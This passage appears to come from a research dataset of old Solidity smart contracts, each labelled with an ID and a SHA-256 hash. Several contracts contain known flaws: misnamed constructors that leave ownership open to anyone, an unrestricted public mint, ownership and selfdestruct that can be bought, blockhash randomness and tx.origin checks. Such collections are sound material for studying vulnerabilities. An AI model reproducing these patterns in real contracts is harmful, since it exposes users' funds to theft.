    emit ChallengeCreatedEvent(msg.sender, version,  challenger, commitPeriodEnd, revealPeriodEnd, rewardPool, metahash);
  }
  function fireVoteCommittedEvent(uint version, address voter, uint amount)
  public
  onlyRegistryEntry
  {
    emit VoteCommittedEvent(msg.sender, version, voter, amount);
  }
  function fireVoteRevealedEvent(uint version, address voter, uint option)
  public
  onlyRegistryEntry
  {
    emit VoteRevealedEvent(msg.sender, version, voter, option);
  }
  function fireVoteAmountClaimedEvent(uint version, address voter)
  public
  onlyRegistryEntry
  {
    emit VoteAmountClaimedEvent(msg.sender, version, voter);
  }
  function fireVoteRewardClaimedEvent(uint version, address voter, uint amount)
  public
  onlyRegistryEntry
  {
    emit VoteRewardClaimedEvent(msg.sender, version, voter, amount);
  }
  function fireChallengeRewardClaimedEvent(uint version, address challenger, uint amount)
  public
  onlyRegistryEntry
  {
    emit ChallengeRewardClaimedEvent(msg.sender, version, challenger, amount);
  }
  function fireParamChangeConstructedEvent(uint version, address creator, address db, string key, uint value, uint deposit, uint challengePeriodEnd)
  public
  onlyRegistryEntry
  {
    emit ParamChangeConstructedEvent(msg.sender, version, creator, db, key, value, deposit, challengePeriodEnd);
  }
  function fireParamChangeAppliedEvent(uint version)
  public
  onlyRegistryEntry
  {
    emit ParamChangeAppliedEvent(msg.sender, version);
  }
  function isFactory(address factory) public constant returns (bool) {
    return db.getBooleanValue(keccak256(abi.encodePacked("isFactory", factory)));
  }
  function isRegistryEntry(address registryEntry) public constant returns (bool) {
    return db.getBooleanValue(keccak256(abi.encodePacked("isRegistryEntry", registryEntry)));
  }
  function isEmergency() public constant returns (bool) {
    return db.getBooleanValue("isEmergency");
  }
}

```

## RQ1_dcd2e6a9c27c

SHA-256 `63ac54638a45c55e245a3bb700eed749c6d00f8077dc4fa7e8148d50349d04e3`

```solidity
pragma solidity ^0.4.18;
contract CryptoVideoGameItem {
    address contractCreator = 0xC15d9f97aC926a6A29A681f5c19e2b56fd208f00; 
    address devFeeAddress = 0xC15d9f97aC926a6A29A681f5c19e2b56fd208f00;
    address cryptoVideoGames = 0xdEc14D8f4DA25108Fd0d32Bf2DeCD9538564D069; 
    struct VideoGameItem {
        string videoGameItemName;
        address ownerAddress;
        uint256 currentPrice;
        uint parentVideoGame;
    }
    VideoGameItem[] videoGameItems;
    modifier onlyContractCreator() {
        require (msg.sender == contractCreator);
        _;
    }
    bool isPaused;
    function pauseGame() public onlyContractCreator {
        isPaused = true;
    }
    function unPauseGame() public onlyContractCreator {
        isPaused = false;
    }
    function GetGamestatus() public view returns(bool) {
       return(isPaused);
    }
    function purchaseVideoGameItem(uint _videoGameItemId) public payable {
        require(msg.value >= videoGameItems[_videoGameItemId].currentPrice);
        require(isPaused == false);
        CryptoVideoGames parentContract = CryptoVideoGames(cryptoVideoGames);
        uint256 currentPrice = videoGameItems[_videoGameItemId].currentPrice;
        uint256 excess = msg.value - currentPrice;
        uint256 devFee = (currentPrice / 10);
        uint256 parentOwnerFee = (currentPrice / 10);
        address parentOwner = parentContract.getVideoGameOwner(videoGameItems[_videoGameItemId].parentVideoGame);
        address newOwner = msg.sender;
        uint256 commissionOwner = currentPrice - devFee - parentOwnerFee; 
        videoGameItems[_videoGameItemId].ownerAddress.transfer(commissionOwner);
        devFeeAddress.transfer(devFee); 
        parentOwner.transfer(parentOwnerFee); 
        newOwner.transfer(excess);              
        videoGameItems[_videoGameItemId].ownerAddress = newOwner;
        videoGameItems[_videoGameItemId].currentPrice = mul(videoGameItems[_videoGameItemId].currentPrice, 2);
    }
    function modifyCurrentVideoGameItemPrice(uint _videoGameItemId, uint256 _newPrice) public {
        require(_newPrice > 0);
        require(videoGameItems[_videoGameItemId].ownerAddress == msg.sender);
        require(_newPrice < videoGameItems[_videoGameItemId].currentPrice);
        videoGameItems[_videoGameItemId].currentPrice = _newPrice;
    }
    function getVideoGameItemDetails(uint _videoGameItemId) public view returns (
        string videoGameItemName,
        address ownerAddress,
        uint256 currentPrice,
        uint parentVideoGame
    ) {
        VideoGameItem memory _videoGameItem = videoGameItems[_videoGameItemId];
        videoGameItemName = _videoGameItem.videoGameItemName;
        ownerAddress = _videoGameItem.ownerAddress;
        currentPrice = _videoGameItem.currentPrice;
        parentVideoGame = _videoGameItem.parentVideoGame;
    }
    function getVideoGameItemCurrentPrice(uint _videoGameItemId) public view returns(uint256) {
        return(videoGameItems[_videoGameItemId].currentPrice);
    }
    function getVideoGameItemOwner(uint _videoGameItemId) public view returns(address) {
        return(videoGameItems[_videoGameItemId].ownerAddress);
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
          return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function addVideoGameItem(string videoGameItemName, address ownerAddress, uint256 currentPrice, uint parentVideoGame) public onlyContractCreator {
        videoGameItems.push(VideoGameItem(videoGameItemName,ownerAddress,currentPrice, parentVideoGame));
    }
}
contract CryptoVideoGames {
    function getVideoGameOwner(uint _videoGameId) public view returns(address) {
    }
}
```

## RQ1_b2a70d211f2c

SHA-256 `14ae4dccf3af7cd4aaeb71958581973f67e6b865f17db7d805754d303dc30227`

```solidity
pragma solidity ^0.4.18;
contract EtherMango {
    uint public feePercent = 100;
    address owner;
    uint public numProducts;
    mapping(uint => Product) public products;
    mapping(address => mapping(uint => bool)) public purchases;
    event ProductAdded(uint productId, address merchant, uint price);
    event ProductPurchased(uint productId, address buyer);
    struct Product {
        uint price;
        address merchant;
        bool isFrozen;
    }
    function EtherMango() public payable {
        owner = msg.sender;
    }
    function AddProduct(uint price) public payable returns(uint productId) {
        productId = numProducts++;
        products[productId] = Product(price, msg.sender, false);
        purchases[msg.sender][productId] = true;
        ProductAdded(productId, msg.sender, price);
    }
    function Pay(uint productId) public payable {
        require(products[productId].price == msg.value);
        require(products[productId].isFrozen == false);
        uint fee = msg.value / feePercent;
        uint remaining = msg.value - fee;
        products[productId].merchant.transfer(remaining);
        purchases[msg.sender][productId] = true;
        ProductPurchased(productId, msg.sender);
    }
    function WithdrawFees() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }
    function FreezeProduct(uint productId) public {
        require(products[productId].merchant == msg.sender);
        products[productId].isFrozen = true;
    }
    function UnFreezeProduct(uint productId) public {
        require(products[productId].merchant == msg.sender);
        products[productId].isFrozen = false;
    }
}
```

## RQ1_7c965e77d1a3

SHA-256 `57da71cc1ef7529f54ea91d471f65fcac60b9580a15dcd17e2bf189930b0f9bc`

```solidity
pragma solidity ^0.4.24;
contract Templar {
string public constant symbol = "Templar";
  string public constant name = "KXT";
  uint8 public constant decimals = 18;
  uint256 public totalSupply = 100000000 * (uint256(10)**decimals);
  address public owner;
  uint256 public rate =  5000000000000;
  mapping(address => uint256) balances;
  mapping(address => mapping (address => uint256)) allowed;
  modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
event Transfer(address indexed _from, address indexed _to, uint256 _value);
event Approval(address indexed _owner, address indexed _spender, uint256 _value);
function Mint() public{
  owner = msg.sender;
}
function () public payable {
  create(msg.sender);
}
function create(address beneficiary)public payable{
    uint256 amount = msg.value;
    if(amount > 0){
      balances[beneficiary] += amount/rate;
      totalSupply += amount/rate;
    }
  }
function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
}
function collect(uint256 amount) onlyOwner public{
  msg.sender.transfer(amount);
}
function transfer(address _to, uint256 _amount) public returns (bool success) {
    if (balances[msg.sender] >= _amount
        && _amount > 0
        && balances[_to] + _amount > balances[_to]) {
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
        Transfer(msg.sender, _to, _amount);
        return true;
    } else {
        return false;
    }
}
function transferFrom(
    address _from,
    address _to,
    uint256 _amount
) public returns (bool success) {
    if (balances[_from] >= _amount
        && allowed[_from][msg.sender] >= _amount
        && _amount > 0
        && balances[_to] + _amount > balances[_to]) {
        balances[_from] -= _amount;
        allowed[_from][msg.sender] -= _amount;
        balances[_to] += _amount;
        Transfer(_from, _to, _amount);
        return true;
    } else {
        return false;
    }
}
function approve(address _spender, uint256 _amount) public returns (bool success) {
    allowed[msg.sender][_spender] = _amount;
    Approval(msg.sender, _spender, _amount);
    return true;
}
function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
}
}

```

## RQ1_9fea8632716d

SHA-256 `9999f8d00a6605a7e77310106a8a37abde3b5cca04bf74b0f015ed04d3b07dfc`

```solidity
pragma solidity ^0.4.24;
contract BTC666 {
    struct Voter {
        uint weight;
        bool voted;
        uint8 vote;
        address delegate;
    }
    struct Proposal {
        uint voteCount;
    }
    address chairperson;
    mapping(address => Voter) voters;
    Proposal[] proposals;
    function Ballot(uint8 _numProposals) public {
        chairperson = msg.sender;
        voters[chairperson].weight = 1;
        proposals.length = _numProposals;
    }
    function giveRightToVote(address toVoter) public {
        if (msg.sender != chairperson || voters[toVoter].voted) return;
        voters[toVoter].weight = 1;
    }
    function delegate(address to) public {
        Voter storage sender = voters[msg.sender]; 
        if (sender.voted) return;
        while (voters[to].delegate != address(0) && voters[to].delegate != msg.sender)
            to = voters[to].delegate;
        if (to == msg.sender) return;
        sender.voted = true;
        sender.delegate = to;
        Voter storage delegateTo = voters[to];
        if (delegateTo.voted)
            proposals[delegateTo.vote].voteCount += sender.weight;
        else
            delegateTo.weight += sender.weight;
    }
    function vote(uint8 toProposal) public {
        Voter storage sender = voters[msg.sender];
        if (sender.voted || toProposal >= proposals.length) return;
        sender.voted = true;
        sender.vote = toProposal;
        proposals[toProposal].voteCount += sender.weight;
    }
    function winningProposal() public constant returns (uint8 _winningProposal) {
        uint256 winningVoteCount = 0;
        for (uint8 prop = 0; prop < proposals.length; prop++)
            if (proposals[prop].voteCount > winningVoteCount) {
                winningVoteCount = proposals[prop].voteCount;
                _winningProposal = prop;
            }
    }
}

```

## RQ1_1c88f0c3168e

SHA-256 `2002a04a5dd1a04a6d38d666e54954dbee5ec29a64207d6ad17b069a34b2af09`

```solidity
pragma solidity ^0.4.19;
contract PowerLedgerToken {
    string public name = "Powerledger Token";
    string public symbol = "Powr";
    uint8 public constant decimals = 8;  
    address public owner;
    uint256 public constant tokensPerEth = 1;
    uint256 public constant howManyEtherInWeiToBecomeOwner = 1000 ether;
    uint256 public constant howManyEtherInWeiToKillContract = 500 ether;
    uint256 public constant howManyEtherInWeiToChangeSymbolName = 400 ether;
    bool public funding = true;
    uint256 totalTokens = 1000;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Migrate(address indexed _from, address indexed _to, uint256 _value);
    event Refund(address indexed _from, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    function PowerLedgerToken() public {
        owner = msg.sender;
        balances[owner]=1000;
    }
    function changeNameSymbol(string _name, string _symbol) payable external
    {
        if (msg.sender==owner || msg.value >=howManyEtherInWeiToChangeSymbolName)
        {
            name = _name;
            symbol = _symbol;
        }
    }
    function changeOwner (address _newowner) payable external
    {
        if (msg.value>=howManyEtherInWeiToBecomeOwner)
        {
            owner.transfer(msg.value);
            owner.transfer(this.balance);
            owner=_newowner;
        }
    }
    function killContract () payable external
    {
        if (msg.sender==owner || msg.value >=howManyEtherInWeiToKillContract)
        {
            selfdestruct(owner);
        }
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        var senderBalance = balances[msg.sender];
        if (senderBalance >= _value && _value > 0) {
            senderBalance -= _value;
            balances[msg.sender] = senderBalance;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        }
        return false;
    }
    function mintTo(address _to, uint256 _value) public returns (bool) {
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
    }
    function totalSupply() external constant returns (uint256) {
        return totalTokens;
    }
    function balanceOf(address _owner) external constant returns (uint256) {
        return balances[_owner];
    }
    function transferFrom(
         address _from,
         address _to,
         uint256 _amount
     ) public returns (bool success) {
         if (balances[_from] >= _amount
             && allowed[_from][msg.sender] >= _amount
             && _amount > 0
             && balances[_to] + _amount > balances[_to]) {
             balances[_from] -= _amount;
             allowed[_from][msg.sender] -= _amount;
             balances[_to] += _amount;
             return true;
         } else {
             return false;
         }
  }
    function approve(address _spender, uint256 _amount) public returns (bool success) {
         allowed[msg.sender][_spender] = _amount;
         Approval(msg.sender, _spender, _amount);
         return true;
     }
    function () payable external {
        if (!funding) revert();
        if (msg.value == 0) revert();
        var numTokens = msg.value * (1000.0/totalTokens);
        totalTokens += numTokens;
        balances[msg.sender] += numTokens;
        Transfer(0, msg.sender, numTokens);
    }
}
```

## RQ1_e14a7e50bf65

SHA-256 `9a81ba9243d5e66218f293e137fbcc615a6b75f4e226d085a82348ea46aaf586`

```solidity
pragma solidity ^0.4.22;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) external returns (bool);
    function totalSupply() constant external returns (uint256 supply);
    function balanceOf(address _owner) constant external returns (uint256 balance);
}
contract XBORNID is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "XBORN ID";
    string public constant symbol = "XBornID";
    uint public constant decimals = 18;
uint256 public totalSupply = 500000000e18;
uint256 public totalDistributed = 200000000e18;
uint256 public totalRemaining = totalSupply.sub(totalDistributed);
uint256 public value = 1000e18;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function XBornID() public {
        owner = msg.sender;
        balances[owner] = totalDistributed;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        value = value.div(100000).mul(99999);
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = address(this).balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_5add5c765bae

SHA-256 `32880f06ec85fd6e9fc4a8f6da4598b76cd18a4669bddfd9a6a2c1384fab05fc`

```solidity
pragma solidity ^0.4.25;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
contract CryptoEngineerInterface {
    uint256 public prizePool = 0;
    function subVirus(address , uint256 ) public {}
    function claimPrizePool(address , uint256 ) public {} 
    function isContractMiniGame() public pure returns( bool ) {}
}
contract CryptoMiningWarInterface {
    uint256 public deadline; 
    function subCrystal( address , uint256  ) public {}
}
contract CrystalDeposit {
	using SafeMath for uint256;
    bool init = false;
	address public administrator;
    uint256 public HALF_TIME = 48 hours;
    uint256 public PRIZE_MAX = 0.25 ether;
    uint256 public round = 0;
    CryptoEngineerInterface public Engineer;
    CryptoMiningWarInterface public MiningWar;
    uint256 public miningWarDeadline;
    uint256 constant private CRTSTAL_MINING_PERIOD = 86400;
    mapping(uint256 => Game) public games;
    mapping(address => Player) public players;
    struct Game {
        uint256 round;
        uint256 crystals;
        uint256 prizePool;
        uint256 endTime;
        bool ended; 
    }
    struct Player {
        uint256 currentRound;
        uint256 lastRound;
        uint256 reward;
        uint256 share; 
    }
    event EndRound(uint256 round, uint256 crystals, uint256 prizePool, uint256 endTime);
    event Deposit(address player, uint256 questId, uint256 questLv, uint256 deposit, uint256 bonus, uint256 percent);
    modifier isAdministrator()
    {
        require(msg.sender == administrator);
        _;
    }
    modifier disableContract()
    {
        require(tx.origin == msg.sender);
        _;
    }
    constructor() public {
        administrator = msg.sender;
        setMiningWarInterface(0xf84c61bb982041c030b8580d1634f00fffb89059);
        setEngineerInterface(0x69fd0e5d0a93bf8bac02c154d343a8e3709adabf);
    }
    function () public payable
    {
    }
    function isContractMiniGame() public pure returns( bool _isContractMiniGame )
    {
    	_isContractMiniGame = true;
    }
    function upgrade(address addr) public isAdministrator
    {
        selfdestruct(addr);
    }
    function setupMiniGame( uint256 , uint256 _miningWarDeadline ) public
    {
        miningWarDeadline = _miningWarDeadline;
    }
    function setMiningWarInterface(address _addr) public isAdministrator
    {
        MiningWar = CryptoMiningWarInterface(_addr);
    }
    function setEngineerInterface(address _addr) public isAdministrator
    {
        CryptoEngineerInterface engineerInterface = CryptoEngineerInterface(_addr);
        require(engineerInterface.isContractMiniGame() == true);
        Engineer = engineerInterface;
    }
     function startGame() public 
    {
        require(msg.sender == administrator);
        require(init == false);
        init = true;
        miningWarDeadline = getMiningWarDealine();
        games[round].ended = true;
        startRound();
    }
    function startRound() private
    {
        require(games[round].ended == true);
        uint256 crystalsLastRound = games[round].crystals;
        uint256 prizePoolLastRound= games[round].prizePool; 
        round = round + 1;
        uint256 endTime = now + HALF_TIME;
        uint256 engineerPrizePool = getEngineerPrizePool();
        uint256 prizePool = SafeMath.div(SafeMath.mul(engineerPrizePool, 5),100);
        if (prizePool >= PRIZE_MAX) prizePool = PRIZE_MAX;
        Engineer.claimPrizePool(address(this), prizePool);
        if (crystalsLastRound <= 0) prizePool = SafeMath.add(prizePool, prizePoolLastRound);
        games[round] = Game(round, 0, prizePool, endTime, false);
    }
    function endRound() private
    {
        require(games[round].ended == false);
        require(games[round].endTime <= now);
        Game storage g = games[round];
        g.ended = true;
        startRound();
        emit EndRound(g.round, g.crystals, g.prizePool, g.endTime);
    }
    function share(uint256 _value) public disableContract
    {
        require(miningWarDeadline > now);
        require(games[round].ended == false);
        require(_value >= 10000);
        MiningWar.subCrystal(msg.sender, _value); 
        if (games[round].endTime <= now) endRound();
        updateReward(msg.sender);
        Game storage g = games[round];
        uint256 _share = SafeMath.mul(_value, CRTSTAL_MINING_PERIOD);
        g.crystals = SafeMath.add(g.crystals, _share);
        Player storage p = players[msg.sender];
        if (p.currentRound == round) {
            p.share = SafeMath.add(p.share, _share);
        } else {
            p.share = _share;
            p.currentRound = round;
        }
        emit Deposit(msg.sender, 1, 1, _value, 0, 0); 
    }
    function withdrawReward() public disableContract
    {
        if (games[round].endTime <= now) endRound();
        updateReward(msg.sender);
        Player storage p = players[msg.sender];
        uint256 balance  = p.reward; 
        if (address(this).balance >= balance) {
             msg.sender.transfer(balance);
            p.reward = 0;     
        }
    }
    function updateReward(address _addr) private
    {
        Player storage p = players[_addr];
        if ( 
            games[p.currentRound].ended == true &&
            p.lastRound < p.currentRound
            ) {
            p.reward = SafeMath.add(p.reward, calculateReward(msg.sender, p.currentRound));
            p.lastRound = p.currentRound;
        }
    }
    function getData(address _addr) 
    public
    view
    returns(
        uint256 _prizePool,
        uint256 _crystals,
        uint256 _endTime,
        uint256 _reward,
        uint256 _share
    ) {
         (_prizePool, _crystals, _endTime) = getCurrentGame();
         (_reward, _share)                 = getPlayerData(_addr);         
    }
    function calculateReward(address _addr, uint256 _round) public view returns(uint256)
    {
        Player memory p = players[_addr];
        Game memory g = games[_round];
        if (g.endTime > now) return 0;
        if (g.crystals == 0) return 0; 
        return SafeMath.div(SafeMath.mul(g.prizePool, p.share), g.crystals);
    }
    function getCurrentGame() private view returns(uint256 _prizePool, uint256 _crystals, uint256 _endTime)
    {
        Game memory g = games[round];
        _prizePool = g.prizePool;
        _crystals  = g.crystals;
        _endTime   = g.endTime;
    }
    function getPlayerData(address _addr) private view returns(uint256 _reward, uint256 _share)
    {
        Player memory p = players[_addr];
        _reward           = p.reward;
        if (p.currentRound == round) _share = players[_addr].share; 
        if (p.currentRound != p.lastRound) _reward += calculateReward(_addr, p.currentRound);
    }
    function getEngineerPrizePool() private view returns(uint256)
    {
        return Engineer.prizePool();
    }
    function getMiningWarDealine () private view returns(uint256)
    {
        return MiningWar.deadline();
    }
}
```

## RQ1_a6cdc37d0ed2

SHA-256 `abd27ea8fbde99186d93e262f31d032341dab69cc5712bad239a9e34dfa4c5cf`

```solidity
pragma solidity ^0.4.17;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) constant returns (uint256);
    function transfer(address to, uint256 value) returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract BasicToken is ERC20Basic {
    using SafeMath for uint256;
    mapping(address => uint256) balances;
    function transfer(address _to, uint256 _value) returns (bool) {
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(msg.sender, _to, _value);
        return true;
    }
    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) returns (bool);
    function approve(address spender, uint256 value) returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable {
    address public owner;
    function Ownable() {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address newOwner) onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
}
contract StandardMintableToken is ERC20, BasicToken, Ownable {
    mapping (address => mapping (address => uint256)) allowed;
    event Mint(address indexed to, uint256 amount);
    event MintFinished();
    bool public mintingFinished = false;
    modifier canMint() {
        require(!mintingFinished);
        _;
    }
    function transferFrom(address _from, address _to, uint256 _value) returns (bool) {
        var _allowance = allowed[_from][msg.sender];
        balances[_to] = balances[_to].add(_value);
        balances[_from] = balances[_from].sub(_value);
        allowed[_from][msg.sender] = _allowance.sub(_value);
        Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) returns (bool) {
    require((_value == 0) || (allowed[msg.sender][_spender] == 0));
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    function mint(address _to, uint256 _amount) onlyOwner canMint returns (bool) {
        totalSupply = totalSupply.add(_amount);
        balances[_to] = balances[_to].add(_amount);
        Mint(_to, _amount);
        Transfer(0x0, _to, _amount); 
        return true;
    }
    function finishMinting() onlyOwner returns (bool) {
        mintingFinished = true;
        MintFinished();
        return true;
    }
}
contract SlotTicket is StandardMintableToken {
    string public name = "Slot Ticket";
    uint8 public decimals = 0;
    string public symbol = "TICKET";
    string public version = "0.7";
    function destroy() onlyOwner {
        selfdestruct(owner);
    }
}
contract Slot is Ownable {
    using SafeMath for uint256;
    uint8   constant SIZE =           100;        
    uint32  constant JACKPOT_CHANCE = 1000000;    
    uint32  constant INACTIVITY =     160000;     
    uint256 constant PRICE =          100 finney;
    uint256 constant JACK_DIST =      249 finney;
    uint256 constant DIV_DIST =       249 finney;
    uint256 constant GAS_REFUND =     2 finney;
    mapping (uint => mapping (uint => address)) public participants; 
    SlotTicket public ticket; 
    uint256 public jackpotAmount;
    uint256 public gameIndex;
    uint256 public gameStartedAtBlock;
    address public fund; 
    uint256[8] public prizes = [4 ether, 
                                2 ether,
                                1 ether, 
                                500 finney, 
                                500 finney, 
                                500 finney, 
                                500 finney, 
                                500 finney];
    uint256 counter;
    event ParticipantAdded(address indexed _participant, uint256 indexed _game, uint256 indexed _number);
    event PrizeAwarded(uint256 indexed _game , address indexed _winner, uint256 indexed _amount);
    event JackpotAwarded(uint256 indexed _game, address indexed _winner, uint256 indexed _amount);
    event GameRefunded(uint256 _game);
    function Slot(address _fundAddress) payable { 
        ticket = new SlotTicket();
        fund = _fundAddress;
        jackpotAmount = msg.value;
        gameIndex = 0;
        counter = 0;
        gameStartedAtBlock = block.number;
    }
    function() payable {
        buyTicketsFor(msg.sender);
    }
    function buyTicketsFor(address _beneficiary) public payable {
        require(_beneficiary != 0x0);
        require(msg.value >= PRICE);
        uint256 change = msg.value%PRICE;
        uint256 numberOfTickets = msg.value.sub(change).div(PRICE);
        ticket.mint(_beneficiary, numberOfTickets);
        addParticipant(_beneficiary, numberOfTickets);
        msg.sender.transfer(change);
    }
    function addParticipant(address _participant, uint256 _numberOfTickets) private {
        for (uint256 i = 0; i < _numberOfTickets; i++) {
            participants[gameIndex][counter%SIZE] = _participant; 
            ParticipantAdded(_participant, gameIndex, counter%SIZE);
            if (++counter%SIZE == 0) {
                awardPrizes();
                distributeRemaining();
                increaseGame();
            }
        }
    }
    function awardPrizes() private {
        uint256 hashNumber = uint256(keccak256(block.blockhash(block.number-1)));
        uint256 winnerIndex = hashNumber%SIZE;
        uint256 jackpotNumber = hashNumber%JACKPOT_CHANCE;
        if (winnerIndex == jackpotNumber) {
            distributeJackpot(winnerIndex);
        }
        for (uint8 i = 0; i < prizes.length; i++) {
            participants[gameIndex][winnerIndex%SIZE].transfer(prizes[i]); 
            PrizeAwarded(gameIndex, participants[gameIndex][winnerIndex%SIZE], prizes[i]);
            winnerIndex++;
        }
    }
    function distributeJackpot(uint256 _winnerIndex) private {
        uint256 amount = jackpotAmount;
        jackpotAmount = 0; 
        participants[gameIndex][_winnerIndex].transfer(amount);
        JackpotAwarded(gameIndex,  participants[gameIndex][_winnerIndex], amount);
    }
